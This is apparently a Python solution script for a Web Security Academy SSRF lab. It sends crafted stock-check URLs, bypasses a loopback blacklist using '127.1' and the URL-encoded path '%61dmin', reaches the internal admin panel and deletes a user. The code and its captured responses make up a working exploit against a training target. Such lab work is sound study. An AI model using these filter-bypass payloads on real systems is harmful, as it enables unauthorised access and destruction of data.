# Lab: SSRF with blacklist-based input filter

import requests

base = "https://0a9800c8049d533080f86279009b003a.web-security-academy.net"
s=requests.Session()

print("===========[step1] Access to admin page===============")
page_admin=s.get(f"{base}/admin")
print(page_admin.text)

'''
Admin interface only available if logged in as an administrator, or if requested from loopback
'''

print("===========[step2] Access Product Page===============")
page_product=s.get(f"{base}/product", params={"productId":"5"})
print(page_product.text)

'''
                        <form id="stockCheckForm" action="/product/stock" method="POST">
                            <select name="stockApi">
                                <option value="http://stock.weliketoshop.net:8080/product/stock/check?productId=5&storeId=1">London</option>
                                <option value="http://stock.weliketoshop.net:8080/product/stock/check?productId=5&storeId=2">Paris</option>
                                <option value="http://stock.weliketoshop.net:8080/product/stock/check?productId=5&storeId=3">Milan</option>
                            </select>
                            <button type="submit" class="button">Check stock</button>
                        </form>
                        <span id="stockCheckResult"></span>
                        <script src="/resources/js/stockCheckPayload.js"></script>
                        <script src="/resources/js/stockCheck.js"></script>
'''

print("===========[step3] Check stock===============")
page_stock = s.post(f"{base}/product/stock",
                    data={"stockApi": "http://stock.weliketoshop.net:8080/product/stock/check?productId=5&storeId=1"})
print(page_stock.request.body)  # To Check request's encoding issue
print(page_stock.status_code)
print(page_stock.text)
'''
stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D5%26storeId%3D1
200
846
'''

print("===========[step3-1] Check stock===============")
page_stock = s.post(f"{base}/product/stock",
                    data={"stockApi": "http://127.0.0.1"})
print(page_stock.request.body)  # To Check request's encoding issue
print(page_stock.status_code)
print(page_stock.text)
'''
stockApi=http%3A%2F%2F127.0.0.1
400
"External stock check blocked for security reasons"
'''

print("===========[step3-2] Check stock===============")
page_stock = s.post(f"{base}/product/stock",
                    data={"stockApi": "http://127.1/"})
print(page_stock.request.body)  # To Check request's encoding issue
print(page_stock.status_code)
print(page_stock.text)
'''
stockApi=http%3A%2F%2F127.1%2F
200
'''

print("===========[step3-3] Check stock===============")
page_stock = s.post(f"{base}/product/stock",
                    data={"stockApi": "http://127.1/admin"})
print(page_stock.request.body)  # To Check request's encoding issue
print(page_stock.status_code)
print(page_stock.text)
'''
stockApi=http%3A%2F%2F127.1%2Fadmin
400
"External stock check blocked for security reasons"
'''

print("===========[step3-4] Check stock===============")
page_stock = s.post(f"{base}/product/stock",
                    data={"stockApi": "http://127.1/%2561dmin"})
print(page_stock.request.body)  # To Check request's encoding issue
print(page_stock.status_code)
print(page_stock.text)
'''
stockApi=http%3A%2F%2F127.1%2F%252561dmin
404
"Not Found"
'''

print("===========[step3-5] Check stock===============")
page_stock = s.post(f"{base}/product/stock",
                    data={"stockApi": "http://127.1/%61dmin"})
print(page_stock.request.body)  # To Check request's encoding issue
print(page_stock.status_code)
print(page_stock.text)
print("[+] Found Validate stockApi admin url: ", "http://127.1/%61dmin")
'''
stockApi=http%3A%2F%2F127.1%2F%2561dmin
200
                    <section>
                        <h1>Users</h1>
                        <div>
                            <span>wiener - </span>
                            <a href="/admin/delete?username=wiener">Delete</a>
                        </div>
                        <div>
                            <span>carlos - </span>
                            <a href="/admin/delete?username=carlos">Delete</a>
                        </div>
                    </section>
'''

print("===========[step4] Access loop Admin Page with stockapi===============")
delete_carlos_url=f"http://127.1/%61dmin/delete?username=carlos"
page_stock_admin_case = s.post(f"{base}/product/stock", data={"stockApi": delete_carlos_url}, allow_redirects=False, timeout=10)
print(page_stock_admin_case.status_code)
print(page_stock_admin_case.text)
'''
302
'''